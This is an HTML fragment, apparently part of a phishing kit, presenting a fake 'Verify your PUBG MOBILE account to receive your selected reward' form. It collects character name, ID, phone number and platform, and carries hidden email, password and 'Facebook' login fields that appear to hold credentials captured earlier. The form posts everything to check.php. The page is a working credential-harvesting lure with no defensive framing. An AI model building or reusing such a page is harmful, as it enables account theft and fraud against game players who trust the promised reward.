...
<div class="menu-notify-txt">Verify your PUBG MOBILE account to receive your selected reward</div>
</div> <!--- menu-notify --->

<form action="check.php" method="post">
<center>
<input type="hidden" class="input-verify" name="email" id="email" value=" vht" readonly>
<input type="hidden" class="input-verify" name="password" id="password" value="rbh" readonly>
<input type="text" class="input-verify br-top" name="nick" id="nick" placeholder="Character Name" autocomplete="off" required>
<input type="number" class="input-verify br-line-top-none" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" class="input-verify br-line-top-none" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
...
<select class="select-verify br-line-top-none" name="rpl" id="rpl" required>
...
<select class="select-verify br-line-top-none br-bottom" name="platform" id="platform" required>
<option selected="selected" disabled="disabled" value="">Platform</option>
<option>Android</option>
<option>iOS</option>
</select>
<input type="hidden" class="input-verify" name="login" id="login" value="Facebook" readonly>
</center>
